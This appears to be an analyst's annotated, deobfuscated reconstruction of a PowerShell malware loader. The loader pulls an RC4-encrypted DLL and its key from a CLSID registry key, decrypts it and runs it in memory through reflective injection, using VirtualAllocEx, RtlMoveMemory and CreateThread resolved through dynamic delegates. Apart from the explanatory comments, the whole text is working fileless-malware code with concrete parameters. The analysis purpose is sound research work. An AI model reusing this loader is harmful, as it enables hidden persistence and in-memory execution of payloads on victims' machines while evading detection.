# not the script that aw9 actually produces. The functions were obfuscated just like in cmd3.ps1.
# Fake functions are omitted and the useless arithmetic expressions produced by pz1 are resolved.

# this script is stored in the entry <last_4_chars_of_GUID_0> of registry key
    # hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgID
# obfuscated by a rotating XOR

# OUTPUT...
    # reads in the obfuscated dll from entry <last 4 chars of guid 0> in reg key
        # hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\VersionIndependentProgID
    # and the decode key from entry <first 4 chars of guid 0> in the same key. Decodes and runs
    # the DLL with reflective DLL injection on this process. Waits 34-68 minutes before exiting.

function zd6 {
    param($arg)[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($arg))
}

# gets the method by name $ul8 from System.dll
function st0 {
    param($ul8)

    $ya7=([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')
    }).GetType('Microsoft.Win32.UnsafeNativeMethods');
    
    $ia4=New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),($ya7.GetMethod('GetModuleHandle').Invoke(0,@('kernel32.dll'))));
    $ya7.GetMethod('GetProcAddress',[reflection.bindingflags] 'Public,Static',$null,[System.Reflection.CallingConventions]::Any,@((New-Object System.Runtime.InteropServices.HandleRef).GetType(),[string]),$null).Invoke($null,@([System.Runtime.InteropServices.HandleRef]$ia4,$ul8))
}

# create an Invoke function in a dynamic assembly with the given args and return type
function yl4{
    param($ul8,$rt2)

    $lg4=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('?RND?')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?',$false).DefineType('?RND?','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate]);

    $lg4.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$ul8).SetImplementationFlags('Runtime,Managed');

    $lg4.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$rt2,$ul8).SetImplementationFlags('Runtime,Managed');

    $lg4.CreateType()
}

# reads the DLL and decode key from the registry, decodes it
function my1 {
    param($ul8,$rt2,$ba9)

    # input...
        # $ul8: hkcu:\software\classes\CLSID\<random_GUID_0>\VersionIndependentProgID
        # $rt2: last 4 characters of GUID
        # $ba9: first 4 characters of GUID

        # reg key entry <first 4 characters of GUID> is an input to the transformation function
        # below to decode the content in reg key entry <last 4 chars of GUID> which is the DLL

    # read decode key from registry
    $bk1=Get-ItemProperty -Path $ul8 -n $ba9|Select-Object -ExpandProperty $ba9;

    # deobfuscate the key
    $ns7=($bk1[32]+33);
    $ol0=$bk1[$ns7..($ns7+31)];
    [array]::Reverse($ol0);

    # read encoded DLL from registry
    $bk1=Get-ItemProperty -Path $ul8 -n $rt2|Select-Object -ExpandProperty $rt2;

    # $ns7 contains a script block that contains the decode routine for the dll (see ub3.ps1)
    # outputs the decoded bytes
    $ns7={
        
        $iv0=0..255; 
        0..255 | %{
	        $gk9 = ($gk9 + $iv0[$_] + $ol0[$_ % $ol0.Length]) % 256;
            $iv0[$_], $iv0[$gk9] = $iv0[$gk9], $iv0[$_]
        };

        $bk1 | %{
	        $xj0 = ($xj0 + 1) % 256;
            $kn0 = ($kn0+$iv0[$xj0]) % 256;
            $iv0[$xj0], $iv0[$kn0] = $iv0[$kn0], $iv0[$xj0];
            $_ -bxor $iv0[($iv0[$xj0] + $iv0[$kn0]) % 256]
        }
    }

    # convert the DLL integer array produced by $ns7 to hex string
    $ga8 = (& $ns7|foreach-object{'{0:X2}' -f $_ }) -join ''

    # convert hex string to byte array (final DLL) (output bytes)
    ($(for($xj0=0; $xj0 -lt $ga8.Length; $xj0+=2) {
	    [convert]::ToByte($ga8.Substring($xj0,2),16)
    }))
}

# random GUID 0. get the decoded DLL
$bk1=my1 "hkcu:\software\classes\CLSID\{0C0F1201-0407-0A0D-1013-0205080B0E11}\VersionIndependentProgID" '0E11' '0C0F';

# perform a reflective DLL injection on this process and wait for the DLL to execute
function sm6 {
    param($bk1,$ne4,$bl0,$fr9)

    # allocate memory for the dll
    $iv0=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((st0 'VirtualAllocEx'),(yl4 @([IntPtr],[IntPtr],[IntPtr],[int],[int])([Intptr]))).invoke(-1,0,$ne4,12288,$fr9);
    
    # move the dll into allocated memory
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((st0 'RtlMoveMemory'),(yl4 @([IntPtr],[byte[]],[UInt32])([Intptr]))).invoke($iv0,$bk1,$ne4);

    # define pointer to an offset in the dll
    $iv0=New-Object System.Intptr -ArgumentList $($iv0.ToInt64()+$bl0);

    # create a thread at the offset
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((st0 'CreateThread'),(yl4 @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr])([Intptr]))).invoke(0,0,$iv0,0,0,0);

    # wait for the thread to finish
    Start-Sleep -s 2648
}
    
sm6 $bk1 $bk1.length 14044 64